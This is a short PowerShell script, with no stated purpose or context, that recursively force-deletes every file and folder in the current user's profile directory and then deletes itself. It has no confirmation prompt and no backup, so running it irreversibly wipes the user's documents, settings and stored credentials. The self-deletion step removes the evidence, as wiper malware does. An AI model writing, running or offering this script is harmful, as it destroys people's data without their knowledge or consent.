$targetDirectory = [System.Environment]::GetFolderPath("UserProfile")
$scriptPath = $MyInvocation.MyCommand.Path

Get-ChildItem -Path $targetDirectory -Recurse | Where-Object { $_.FullName -ne $scriptPath } | Remove-Item -Force -Recurse

# Optionally, delete the script itself after everything else has been deleted
Remove-Item $scriptPath -Force
